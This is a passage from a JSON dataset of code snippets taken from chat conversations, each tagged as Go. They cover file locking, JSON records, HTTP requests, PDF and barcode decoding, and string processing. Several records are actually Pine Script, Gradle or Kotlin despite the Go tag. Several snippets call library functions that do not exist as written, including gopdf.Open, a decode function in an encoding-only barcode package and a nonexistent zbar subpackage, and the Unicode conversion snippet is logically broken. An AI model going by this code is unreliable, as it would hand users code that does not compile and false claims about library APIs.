    "code": "// 打开文件时获取锁\nfile, err := os.OpenFile(filename, os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)\nif err != nil {\n    return nil, err\n}\n\n// 获取文件锁\nif shared {\n    if err := syscall.Flock(int(file.Fd()), syscall.LOCK_SH); err != nil {\n        file.Close()\n        return nil, err\n    }\n} else {\n    if err := syscall.Flock(int(file.Fd()), syscall.LOCK_EX); err != nil {\n        file.Close()\n        return nil, err\n    }\n}\n\n// 读/写文件\n\n// 释放文件锁\nif shared {\n    syscall.Flock(int(file.Fd()), syscall.LOCK_UN)\n}\nfile.Close()",
    "filename": "4bf094774cd64ca2ac6889d8ea595ab3_1.go"
  },
  {
    "conversation_hash": "4bf094774cd64ca2ac6889d8ea595ab3",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "type Record struct {\n    TarGetMachineIp string\n    RespContent     string\n    Time            time.Time\n}\n\nfunc load(filename string) ([]Record, error) {\n    file, err := os.Open(filename)\n    if err != nil {\n        return nil, err\n    }\n    defer file.Close()\n\n    var records []Record\n    decoder := json.NewDecoder(file)\n    if err := decoder.Decode(&records); err != nil {\n        return nil, err\n    }\n    return records, nil\n}\n\nfunc save(filename string, records []Record) error {\n    file, err := os.OpenFile(filename, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0644)\n    if err != nil {\n        return err\n    }\n    defer file.Close()\n\n    encoder := json.NewEncoder(file)\n    if err := encoder.Encode(records); err != nil {\n        return err\n    }\n    return nil\n}",
    "filename": "4bf094774cd64ca2ac6889d8ea595ab3_2.go"
  },
  {
    "conversation_hash": "4bf094774cd64ca2ac6889d8ea595ab3",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"encoding/json\"\n    \"fmt\"\n    \"os\"\n)\n\ntype Record struct {\n    TargetMachineIP string\n    RespContent     string\n    Time            string\n}\n\nfunc main() {\n    file, err := os.Open(\"data.json\")\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n    defer file.Close()\n\n    decoder := json.NewDecoder(file)\n    var records []Record\n    err = decoder.Decode(&records)\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n\n    fmt.Printf(\"Loaded %d records\\n\", len(records))\n    for _, r := range records {\n        fmt.Printf(\"%s: [%s] %s\\n\", r.Time, r.TargetMachineIP, r.RespContent)\n    }\n}",
    "filename": "4bf094774cd64ca2ac6889d8ea595ab3_3.go"
  },
  {
    "conversation_hash": "4bf094774cd64ca2ac6889d8ea595ab3",
    "code_index": 5,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"github.com/valyala/fasthttp\"\n)\n\nfunc main() {\n    url := \"https://jsonplaceholder.typicode.com/todos/1\"\n    req := fasthttp.AcquireRequest()\n    defer fasthttp.ReleaseRequest(req)\n\n    resp := fasthttp.AcquireResponse()\n    defer fasthttp.ReleaseResponse(resp)\n\n    req.SetRequestURI(url)\n    req.Header.SetMethod(\"GET\")\n\n    if err := fasthttp.Do(req, resp); err != nil {\n        fmt.Println(\"Error:\", err)\n        return\n    }\n\n    status := resp.StatusCode()\n    body := resp.Body()\n\n    fmt.Printf(\"Status: %d\\n\", status)\n    fmt.Printf(\"Response Body:\\n%s\\n\", body)\n}",
    "filename": "4bf094774cd64ca2ac6889d8ea595ab3_5.go"
  },
  {
    "conversation_hash": "7ffee4c97c64135d1e1c963c7b375895",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"github.com/signintech/gopdf\"\n\t\"github.com/tuotoo/qrcode\"\n)\n\nfunc main() {\n\t// 打开pdf文件并创建PDF文档对象\n\tpdf, err := gopdf.Open(\"example.pdf\")\n\tif err != nil {\n\t\tfmt.Println(err)\n\t\treturn\n\t}\n\tdefer pdf.Close()\n\n\t// 循环遍历每一页\n\tfor i := 1; i <= pdf.NumPage(); i++ {\n\t\t// 读取当前页的图像对象\n\t\timg, err := pdf.Image(i, 1.0)\n\t\tif err != nil {\n\t\t\tfmt.Println(err)\n\t\t\treturn\n\t\t}\n\t\t// 解析条形码\n\t\tqrCodes, err := qrcode.DecodeMulti(img)\n\t\tif err != nil {\n\t\t\tfmt.Println(err)\n\t\t\treturn\n\t\t}\n\t\t// 打印条形码\n\t\tfor _, qrCode := range qrCodes {\n\t\t\tfmt.Println(qrCode.Content)\n\t\t}\n\t}\n}",
    "filename": "7ffee4c97c64135d1e1c963c7b375895_0.go"
  },
  {
    "conversation_hash": "90d5089a277c534e5ce9819f9f86764c",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"github.com/pdfcpu/pdfcpu/pkg/pdfcpu\"\n    \"io/ioutil\"\n    \"os\"\n    \"strconv\"\n)\n\nfunc main() {\n    // 读取pdf文件\n    inFile := \"example.pdf\"\n    inBytes, err := ioutil.ReadFile(inFile)\n    if err != nil {\n        fmt.Println(\"Error reading input file:\", err)\n        return\n    }\n\n    // 打开pdf文件\n    pdf, err := pdfcpu.NewPDFContext(inBytes)\n    if err != nil {\n        fmt.Println(\"Error opening pdf file:\", err)\n        return\n    }\n\n    // 遍历所有页\n    for i := 1; i <= pdf.PageCount; i++ {\n        // 读取当前页\n        page, err := pdfcpu.ExtractPage(inFile, i)\n        if err != nil {\n            fmt.Println(\"Error extracting page\", i, err)\n            continue\n        }\n\n        // 遍历图片\n        for _, img := range page.Images {\n            // 保存图片\n            outPath := \"output/image_page\" + strconv.Itoa(i) + \".jpg\"\n            outFile, err := os.Create(outPath)\n            if err != nil {\n                fmt.Println(\"Error creating output file\", err)\n                continue\n            }\n            defer outFile.Close()\n\n            _, err = outFile.Write(img.Bytes)\n            if err != nil {\n                fmt.Println(\"Error writing output file\", err)\n                continue\n            }\n\n            fmt.Println(\"Saved image to\", outPath)\n        }\n    }\n\n    fmt.Println(\"Finished processing\", pdf.PageCount, \"pages\")\n}",
    "filename": "90d5089a277c534e5ce9819f9f86764c_0.go"
  },
  {
    "conversation_hash": "90d5089a277c534e5ce9819f9f86764c",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"github.com/makiuchi-d/gozxing\"\n    \"github.com/makiuchi-d/gozxing/qrcode\"\n    \"github.com/pdfcpu/pdfcpu/pkg/pdfcpu\"\n    \"io/ioutil\"\n    \"os\"\n)\n\nfunc main() {\n    // 读取pdf文件\n    inFile := \"example.pdf\"\n    inBytes, err := ioutil.ReadFile(inFile)\n    if err != nil {\n        fmt.Println(\"Error reading input file:\", err)\n        return\n    }\n\n    // 打开pdf文件\n    pdf, err := pdfcpu.NewPDFContext(inBytes)\n    if err != nil {\n        fmt.Println(\"Error opening pdf file:\", err)\n        return\n    }\n\n    // 创建输出文件\n    outFile, err := os.Create(\"output.txt\")\n    if err != nil {\n        fmt.Println(\"Error creating output file\", err)\n        return\n    }\n    defer outFile.Close()\n\n    // 遍历所有页\n    for i := 1; i <= pdf.PageCount; i++ {\n        // 读取当前页\n        page, err := pdfcpu.ExtractPage(inFile, i)\n        if err != nil {\n            fmt.Println(\"Error extracting page\", i, err)\n            continue\n        }\n\n        // 遍历图片\n        for _, img := range page.Images {\n            // 创建zxing的二维码读取器\n            reader := qrcode.NewQRCodeReader()\n\n            // 解码条形码\n            binImg, _ := gozxing.NewBinaryBitmapFromByteArray(img.Bytes, img.Width, img.Height)\n            jResult, err := reader.DecodeWithoutHints(binImg)\n            if err != nil {\n                fmt.Println(\"Error decoding barcode\", err)\n                continue\n            }\n\n            // 将解码结果写入输出文件\n            outFile.WriteString(jResult.String())\n            outFile.WriteString(\"\\n\")\n\n            fmt.Println(\"Decoded barcode:\", jResult)\n        }\n    }\n\n    fmt.Println(\"Finished processing\", pdf.PageCount, \"pages\")\n}",
    "filename": "90d5089a277c534e5ce9819f9f86764c_1.go"
  },
  {
    "conversation_hash": "88e0798579a03730588af9c3dcbe6c33",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"strings\"\n)\n\nfunc main() {\n    s1 := \"foo/bar\"\n    s2 := \"foo/bar/\"\n\n    fmt.Println(strings.HasSuffix(s1, \"/\")) // false\n    fmt.Println(strings.HasSuffix(s2, \"/\")) // true\n}",
    "filename": "88e0798579a03730588af9c3dcbe6c33_0.go"
  },
  {
    "conversation_hash": "88e0798579a03730588af9c3dcbe6c33",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"time\"\n)\n\nfunc main() {\n    fmt.Println(\"开始休息\")\n    time.Sleep(3 * time.Second) // 休息3秒（即3000毫秒）\n    fmt.Println(\"休息结束\")\n}",
    "filename": "88e0798579a03730588af9c3dcbe6c33_1.go"
  },
  {
    "conversation_hash": "88e0798579a03730588af9c3dcbe6c33",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"net/url\"\n    \"strings\"\n)\n\nfunc main() {\n    urlStr := \"https://www.example.com/path?foo=bar\"\n    parsedUrl, err := url.Parse(urlStr)\n    if err != nil {\n        panic(err)\n    }\n\n    // 将字符串按照 . 分隔成若干个子串，并获取其中最后两个子串\n    domainParts := strings.Split(parsedUrl.Hostname(), \".\")\n    topLevelDomain := domainParts[len(domainParts)-1]\n    secondLevelDomain := domainParts[len(domainParts)-2]\n\n    // 将最后两个子串组合起来，得到主域名\n    mainDomain := fmt.Sprintf(\"%s.%s\", secondLevelDomain, topLevelDomain)\n\n    fmt.Println(\"URL:\", urlStr)\n    fmt.Println(\"主域名:\", mainDomain)\n}",
    "filename": "88e0798579a03730588af9c3dcbe6c33_3.go"
  },
  {
    "conversation_hash": "4953e31a0925f45e47f13a0b689e24e6",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "getdata2 := []byte{}\nbuf := make([]byte, 1024)\nfor {\n    n, err := connection.Read(buf)\n    if err != nil {\n        if err != io.EOF {\n            fmt.Println(\"Error reading data:\", err)\n        }\n        break\n    }\n    getdata2 = append(getdata2, buf[:n]...)\n}",
    "filename": "4953e31a0925f45e47f13a0b689e24e6_0.go"
  },
  {
    "conversation_hash": "4953e31a0925f45e47f13a0b689e24e6",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "import \"bytes\"\n\n// 假设 data 是待处理的字节数组\ndata = bytes.TrimSpace(data)  // 去掉首尾空白字符\nsubData := bytes.Split(data, []byte{' '})  // 拆分成多个子字节数组\nvar result []byte  // 用于保存处理后的结果\nfor _, sub := range subData {\n    // 如果子字节数组不为空，则追加到结果中\n    if len(sub) > 0 {\n        result = append(result, sub...)\n    }\n}",
    "filename": "4953e31a0925f45e47f13a0b689e24e6_2.go"
  },
  {
    "conversation_hash": "4953e31a0925f45e47f13a0b689e24e6",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "import \"regexp\"\n\nstr := \"Hello, 世界！ 1234 【】。。。\"\n\n// 定义一个正则表达式，用于匹配除了字母和符号以外的其他字符\nreg := regexp.MustCompile(`[^\\w\\s]`)\n\n// 使用正则表达式匹配字符串\nmatches := reg.FindAllString(str, -1)\n\n// 将原字符串中匹配到的子字符串替换成空串\nfor _, match := range matches {\n    str = strings.ReplaceAll(str, match, \"\")\n}\n\nfmt.Println(str) // 输出：Hello 世界 1234",
    "filename": "4953e31a0925f45e47f13a0b689e24e6_3.go"
  },
  {
    "conversation_hash": "4953e31a0925f45e47f13a0b689e24e6",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "import (\n    \"fmt\"\n    \"regexp\"\n    \"unicode\"\n)\n\nstr := \"Hello, 世界！1234 【】...$#^&*()_+\"\n\n// 将字符串中的中文字符转成Unicode格式\nrs := []rune(str)\nunicodeStr := \"\"\nfor _, r := range rs {\n    if unicode.Is(unicode.Han, r) {\n        unicodeStr += fmt.Sprintf(\"\\\\u%x\", r)\n    } else {\n        unicodeStr += string(r)\n    }\n}\n\n// 定义一个正则表达式，用于匹配非字母、符号和数字的字符\nreg := regexp.MustCompile(`[^\\p{L}\\p{N}\\p{P}\\p{Zs}]`)\n\n// 使用正则表达式匹配字符串\nmatches := reg.FindAllString(unicodeStr, -1)\n\n// 将匹配到的子字符串删除\nfilteredUnicodeStr := unicodeStr\nfor _, match := range matches {\n    filteredUnicodeStr = strings.ReplaceAll(filteredUnicodeStr, match, \"\")\n}\n\n// 将字符串中的Unicode字符转成中文格式\nunicodeBytes, _ := hex.DecodeString(strings.ReplaceAll(strings.Trim(filteredUnicodeStr, \"\\\"\"), \"\\\\u\", \"\"))\nstr = string(unicodeBytes)\n\nfmt.Println(str) // 输出：Hello 世界1234 【】...",
    "filename": "4953e31a0925f45e47f13a0b689e24e6_4.go"
  },
  {
    "conversation_hash": "6da289ae7f8a5e430bec1a1c35937ae8",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\n\nstudy(\"Animated Label\", overlay=true)\n\n// Initialize variables\nvar startY = 0\nvar direction = 1\n\n// Update position of label\nstartY := direction > 0 ? startY + 1 : startY - 1\n\n// Change direction when label reaches top or bottom of chart\nif (startY >= high)\n    direction := -1\nif (startY <= low)\n    direction := 1\n\n// Create animated label\nlabel.new(bar_index, startY, text=\"Animated Label\", yloc=yloc.abovebar, color=color.yellow)",
    "filename": "6da289ae7f8a5e430bec1a1c35937ae8_0.go"
  },
  {
    "conversation_hash": "6da289ae7f8a5e430bec1a1c35937ae8",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstudy(\"Pivot-Based High and Low\", overlay=true)\n\n// Calculate daily pivot points\ndaily_high = security(syminfo.tickerid, \"D\", high)\ndaily_low = security(syminfo.tickerid, \"D\", low)\ndaily_close = security(syminfo.tickerid, \"D\", close)\npivot = (daily_high + daily_low + daily_close) / 3\n\n// Calculate support and resistance levels based on pivot points\nsupport1 = (2 * pivot) - daily_high\nsupport2 = pivot - (daily_high - daily_low)\nresistance1 = (2 * pivot) - daily_low\nresistance2 = pivot + (daily_high - daily_low)\n\n// Calculate the high and low prices of the current bar\nthis_high = high\nthis_low = low\n\n// Check if the current bar forms a reversal pattern\nif (this_high > resistance2)\n    this_high := resistance2\nif (this_low < support2)\n    this_low := support2\n\n// Draw the high and low prices on the chart\nplot(this_high, color=color.green, style=plot.style_stepline, linewidth=2, title=\"Pivot High\")\nplot(this_low, color=color.red, style=plot.style_stepline, linewidth=2, title=\"Pivot Low\")",
    "filename": "6da289ae7f8a5e430bec1a1c35937ae8_4.go"
  },
  {
    "conversation_hash": "b06a56e556ff4854a40a1c2fb9855f33",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "import (\n    \"fmt\"\n    \"image/png\"\n    \"os\"\n\n    \"github.com/boombuler/barcode\"\n    \"github.com/boombuler/barcode/ean\"\n)\n\nfunc main() {\n    // 读取图片\n    f, _ := os.Open(\"barcode.png\")\n    defer f.Close()\n\n    img, _ := png.Decode(f)\n\n    // 解析条形码\n    result, err := barcode.Decode(img, ean.UPCA)\n    if err != nil {\n        fmt.Println(\"Error:\", err.Error())\n        return\n    }\n\n    fmt.Println(\"Result:\", result.Data)\n}",
    "filename": "b06a56e556ff4854a40a1c2fb9855f33_0.go"
  },
  {
    "conversation_hash": "b06a56e556ff4854a40a1c2fb9855f33",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "import (\n    \"image/jpeg\"\n    \"image/png\"\n    \"os\"\n)\n\nfunc main() {\n    // 读取 JPG 图像\n    f, _ := os.Open(\"barcode.jpg\")\n    defer f.Close()\n\n    img, _ := jpeg.Decode(f)\n\n    // 将 JPG 转为 PNG\n    pngFile, _ := os.Create(\"barcode.png\")\n    defer pngFile.Close()\n\n    png.Encode(pngFile, img)\n}",
    "filename": "b06a56e556ff4854a40a1c2fb9855f33_1.go"
  },
  {
    "conversation_hash": "97dc9a1e33f6292906679011bacf397a",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "file, err := os.Open(\"example.jpg\")\nif err != nil {\n    log.Fatalf(\"Failed to open file: %v\", err)\n}\ndefer file.Close()\n\n// 使用 imaging.Decode() 函数读取图像\nimg, err := imaging.Decode(file)\nif err != nil {\n    log.Fatalf(\"Failed to decode image: %v\", err)\n}",
    "filename": "97dc9a1e33f6292906679011bacf397a_2.go"
  },
  {
    "conversation_hash": "97dc9a1e33f6292906679011bacf397a",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "// 保存到另一个文件\nerr = imaging.Save(borderedImg, \"example_bordered.jpg\")\nif err != nil {\n    log.Fatalf(\"Failed to save image: %v\", err)\n}",
    "filename": "97dc9a1e33f6292906679011bacf397a_4.go"
  },
  {
    "conversation_hash": "82f7e5fe0197f2692fb61166ff517896",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"image\"\n    \"os\"\n\n    \"github.com/makiuchi-d/gozxing\"\n    \"github.com/makiuchi-d/gozxing/qrcode\"\n    \"github.com/makiuchi-d/gozxing/zbar\"\n    \"golang.org/x/image/png\"\n)\n\nfunc main() {\n    // 打开PNG图片文件\n    file, err := os.Open(\"barcode.png\")\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n    defer file.Close()\n\n    // 解码PNG图片为image.Image对象\n    img, err := png.Decode(file)\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n\n    // 转换image.Image对象为gozxing的BitMatrix对象\n    bmp, _ := gozxing.NewBinaryBitmapFromImage(img)\n\n    // 初始化ZBar解码器\n    reader := zbar.NewQRCodeReader()\n    hints := make(map[gozxing.DecodeHintType]interface{})\n    hints[gozxing.DecodeHintType_PURE_BARCODE] = true\n\n    // 尝试解码条形码\n    result, err := reader.DecodeWithState(bmp, hints)\n    if err != nil {\n        fmt.Println(err)\n        return\n    }\n    fmt.Println(\"解码结果：\", result.GetText())\n}",
    "filename": "82f7e5fe0197f2692fb61166ff517896_0.go"
  },
  {
    "conversation_hash": "2c7cb15bea2a9d7716933e0936cb4e83",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    //...\n    buildTypes {\n        debug {\n            //日志输出编码格式\n            ndk {\n                abiFilters \"armeabi-v7a\", \"arm64-v8a\", \"x86\", \"x86_64\"\n                cFlags \"-fvisibility=hidden -DLOG_NDEBUG=0\", \"-DANDROID_TOOLCHAIN=clang\"\n                stl \"c++_static\"\n            }\n            externalNativeBuild {\n                cmake {\n                    arguments \"-DANDROID_STL=c++_static\",\n                    \"-DANDROID_TOOLCHAIN=clang\",\n                    \"-DANDROID_ARM_NEON=TRUE\"\n                }\n            }\n            proguardFile getDefaultProguardFile('proguard-android.txt'), 'proguard-rules.pro'\n            minifyEnabled false\n            debuggable true\n            jniDebuggable true\n            renderscriptDebuggable true\n            testCoverageEnabled true\n            pseudoLocalesEnabled true\n            zipAlignEnabled true\n        }\n    }\n    //...\n}",
    "filename": "2c7cb15bea2a9d7716933e0936cb4e83_3.go"
  },
  {
    "conversation_hash": "9cd81acef2bd0681319b7101b83b0300",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "sealed class Mode {\n    object Normal : Mode()\n    object Connecting : Mode()\n    object Deleting : Mode()\n    object Emulating : Mode()\n    object SendPackets : Mode()\n}",
    "filename": "9cd81acef2bd0681319b7101b83b0300_3.go"
  },
  {
    "conversation_hash": "fdb61d9006b52fd13289ccf79ade89c6",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "android {\n   ...\n   defaultConfig {\n      ...\n      externalNativeBuild {\n         cmake {\n            cppFlags \"-std=c++11 -frtti -fexceptions\"\n            abiFilters 'armeabi-v7a', 'arm64-v8a', 'x86', 'x86_64'\n         }\n      }\n   }\n   ...\n   externalNativeBuild {\n      cmake {\n         path \"CMakeLists.txt\"\n      }\n   }\n}",
    "filename": "fdb61d9006b52fd13289ccf79ade89c6_0.go"
  },
  {
    "conversation_hash": "fdb61d9006b52fd13289ccf79ade89c6",
    "code_index": 4,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    ...\n    defaultConfig {\n        ...\n        externalNativeBuild {\n            cmake {\n                cppFlags \"-std=c++11\"\n                arguments \"-DANDROID_STL=c++_shared\"\n            }\n        }\n    }\n    externalNativeBuild {\n        cmake {\n            path \"CMakeLists.txt\"\n        }\n    }\n}",
    "filename": "fdb61d9006b52fd13289ccf79ade89c6_4.go"
  },
  {
    "conversation_hash": "fdb61d9006b52fd13289ccf79ade89c6",
    "code_index": 8,
    "language": "Go",
    "libraries": [],
    "code": "android {\n    ...\n    defaultConfig {\n        ...\n        ndk {\n            moduleName \"my_library\"\n        }\n    }\n    ...\n    sourceSets.main {\n        jniLibs.srcDirs = ['src/main/libs']\n    }\n}",
    "filename": "fdb61d9006b52fd13289ccf79ade89c6_8.go"
  },
  {
    "conversation_hash": "c468b8a71c7de74d4d59da05fa9edefd",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "if\n            /    \\\n           &&    >\n          /  \\   / \\\n          A   B  C  D\n         / \\\n        if  G = G + 1\n       /  \\\n      <    :=\n     / \\   /  \\\n    A   B  F   0\n        / \\\n       := 1\n       / \\\n      F   :=\n         /  \\\n        t  1",
    "filename": "c468b8a71c7de74d4d59da05fa9edefd_0.go"
  },
  {
    "conversation_hash": "800cbfbce9be93cb12ff77b722beed16",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstudy(\"Order Block Indicator for Smart Money\",overlay=true)\n\n// Set input variables\nvar float orderBlockSize = input(title=\"Order Block Size\", defval=50)\nvar float signalLineValue = input(title=\"Signal Line Value\", defval=0.5)\n\n// Calculate volume profile levels\nvar float high = highest(high[1], orderBlockSize)\nvar float low = lowest(low[1], orderBlockSize)\n\nvar float level = iff(high - low > 0, (close - low) / (high - low), 0)\nvar float volumeAtLevel = sum(volume * level, orderBlockSize)\nvar float rollingVolumeAtLevel = sum(volumeAtLevel, orderBlockSize)\n\n// Set plot colors\nplotColor = iff(volumeAtLevel > rollingVolumeAtLevel * signalLineValue, color.lime, color.red)\n\n// Draw order block indicator\nplot(rollingVolumeAtLevel * 0.5, title=\"Order Block\", color=plotColor, style=plot.style_histogram, linewidth=4)\n\n// Add signal line\nhline(signalLineValue, title=\"Signal Line\", color=color.gray, linestyle=hline.style_dotted, linewidth=2)",
    "filename": "800cbfbce9be93cb12ff77b722beed16_1.go"
  },
  {
    "conversation_hash": "728589dd51d151f6b6676f997670a504",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"bufio\"\n    \"os\"\n\n    \"github.com/jung-kurt/gofpdf\"\n)\n\nfunc main() {\n    // 创建PDF实例\n    pdf := gofpdf.New(\"P\", \"mm\", \"A4\", \"\")\n\n    // 添加一页\n    pdf.AddPage()\n\n    // 从URL中添加图像\n    pdf.ImageOptions(\n        \"https://www.golang.org/doc/gopher/pkg.png\", // 图像URL\n        10,                                           // 左上角的X坐标\n        10,                                           // 左上角的Y坐标\n        50,                                           // 图像宽度\n        0,                                            // 根据宽度缩放图像\n        false,                                        // 不反转Y轴\n        gofpdf.ImageOptions{ReadDpi: true},           // 读取图像DPI数据\n        0,                                            // 图像旋转角度\n        \"\")                                          // 图像文件类型（PNG，JPG等）\n\n    // 输出PDF文件\n    err := pdf.OutputFileAndClose(\"image.pdf\")\n    if err != nil {\n        panic(err)\n    }\n\n    // 打开PDF文件并查找图像\n    file, err := os.Open(\"image.pdf\")\n    if err != nil {\n        panic(err)\n    }\n    defer file.Close()\n\n    scanner := bufio.NewScanner(file)\n    for scanner.Scan() {\n        line := scanner.Text()\n        if line == \"stream\" {\n            // 找到了一个图像\n            // 在这里执行你的操作\n        }\n    }\n}",
    "filename": "728589dd51d151f6b6676f997670a504_0.go"
  },
  {
    "conversation_hash": "728589dd51d151f6b6676f997670a504",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n\n    \"github.com/unidoc/unidoc/pdf/core\"\n    \"github.com/unidoc/unidoc/pdf/model\"\n)\n\nfunc main() {\n    // 打开PDF文件\n    file, err := model.NewPdfReaderFromFile(\"test.pdf\")\n    if err != nil {\n        panic(err)\n    }\n\n    // 遍历所有对象\n    _, max := file.GetNumPages()\n    for i := 1; i <= max; i++ {\n        page, err := file.GetPage(i)\n        if err != nil {\n            panic(err)\n        }\n\n        // 遍历页面中的对象\n        for _, obj := range page.GetAllAnnots() {\n            // 找到类型为图片的对象\n            if annot, ok := obj.(*core.PdfAnnotation); ok {\n                if annot.Subtype.Name() == \"Image\" {\n                    // 获取图像数据\n                    img, err := annot.GetImage()\n                    if err != nil {\n                        panic(err)\n                    }\n\n                    // 保存图像到文件\n                    imgData, err := img.GetBytes()\n                    if err != nil {\n                        panic(err)\n                    }\n\n                    // TODO: 在这里执行您的操作，例如将图像保存到磁盘上\n                    fmt.Printf(\"Image found on page %d with subtype=%s, width=%f, height=%f, name=%s\\n\",\n                        i, annot.Subtype.Name(), img.Width, img.Height, img.Name)\n                }\n            }\n        }\n    }\n}",
    "filename": "728589dd51d151f6b6676f997670a504_1.go"
  },
  {
    "conversation_hash": "728589dd51d151f6b6676f997670a504",
    "code_index": 7,
    "language": "Go",
    "libraries": [],
    "code": "deviceID, err := model.CalculateDeviceID()\nif err != nil {\n    panic(err)\n}\nfmt.Println(deviceID)",
    "filename": "728589dd51d151f6b6676f997670a504_7.go"
  },
  {
    "conversation_hash": "5152a0f01206ff812a69870aadfc2477",
    "code_index": 1,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n    \"fmt\"\n    \"image\"\n    \"os\"\n    _ \"image/jpeg\"\n    _ \"image/png\"\n    \"github.com/makiuchi-d/gozxing\"\n    \"github.com/makiuchi-d/gozxing/qrcode/decoder\"\n)\n\nfunc main() {\n    // 载入图片\n    file, _ := os.Open(\"barcode.png\")\n    defer file.Close()\n\n    img, _, _ := image.Decode(file)\n\n    // 创建解码器\n    src := gozxing.NewGoImage(img)\n    binarizer := gozxing.NewHybridBinarizer(src)\n    fmt.Println(binarizer.GetBlackRow(0, nil))\n    bitmap, _ := gozxing.NewBinaryBitmap(binarizer)\n    reader := decoder.NewQRCodeReader()\n\n    // 解码\n    result, _ := reader.Decode(bitmap, nil)\n    fmt.Println(result.GetText())\n}",
    "filename": "5152a0f01206ff812a69870aadfc2477_1.go"
  },
  {
    "conversation_hash": "97c003c5f3d1ba6f7df7a4a24043b568",
    "code_index": 2,
    "language": "Go",
    "libraries": [],
    "code": "plugins {\n    ...\n    id 'com.android.application' version '8.0.1' // This line specifies the version of Android Gradle plugin\n    ...\n}",
    "filename": "97c003c5f3d1ba6f7df7a4a24043b568_2.go"
  },
  {
    "conversation_hash": "97c003c5f3d1ba6f7df7a4a24043b568",
    "code_index": 3,
    "language": "Go",
    "libraries": [],
    "code": "plugins {\n    ...\n    id 'com.android.application' version '7.4.1' // use the same version as indicated in the error\n    ...\n}",
    "filename": "97c003c5f3d1ba6f7df7a4a24043b568_3.go"
  },
  {
    "conversation_hash": "0f3db3b973e6414796571f8abe7f7607",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "//@version=4\nstudy(\"Sunday Close Line\", shorttitle=\"SCL\", overlay=true)\n\n// Function to check if a given timestamp is Sunday\nisSunday(timestamp) => dayofweek(timestamp) == 1\n\n// Loop through the previous bars to find Sunday's close price\nvar float sundayClose = na\nfor i = 1 to 200   // you can increase the value if you want to search further back\n    if isSunday(timenow - (i * barmerge.lookback_resolution))\n        sundayClose := security(syminfo.tickerid, \"D\", close[i], lookahead=barmerge.lookahead_on)\n\n// Draw the horizontal line\nline.new(x1=bar_index[1], y1=sundayClose, x2=bar_index, y2=sundayClose, color=color.red, width=2, style=line.style_solid)",
    "filename": "0f3db3b973e6414796571f8abe7f7607_0.go"
  },
  {
    "conversation_hash": "ee0f6c4a8a1d7a4ee05cf415b31d427f",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
    "code": "package main\n\nimport (\n\t\"fmt\"\n\t\"strconv\"\n)\n\n// Eval функция выполняет арифметические операции с двумя числами\nfunc Eval(a, b float64, operator string) (float64, error) {\n\tswitch operator {\n\tcase \"+\":\n\t\treturn a + b, nil\n\tcase \"-\":\n\t\treturn a - b, nil\n\tcase \"*\":\n\t\treturn a * b, nil\n\tcase \"/\":\n\t\tif b == 0 {\n\t\t\treturn 0, fmt.Errorf(\"division by zero\")\n\t\t}\n\t\treturn a / b, nil\n\tdefault:\n\t\treturn 0, fmt.Errorf(\"unknown operator: %s\", operator)\n\t}\n}\n\nfunc main() {\n\tnum1 := 10.0\n\tnum2 := 5.0\n\toperator := \"+\"\n\n\tresult, err := Eval(num1, num2, operator)\n\tif err != nil {\n\t\tfmt.Println(\"Ошибка: \", err)\n\t} else {\n\t\tfmt.Printf(\"%.2f %s %.2f = %.2f\\n\", num1, operator, num2, result)\n\t}\n}",
    "filename": "ee0f6c4a8a1d7a4ee05cf415b31d427f_0.go"
  },
  {
    "conversation_hash": "563e57b314fcc30de9e73c1da6e5a6da",
    "code_index": 0,
    "language": "Go",
    "libraries": [],
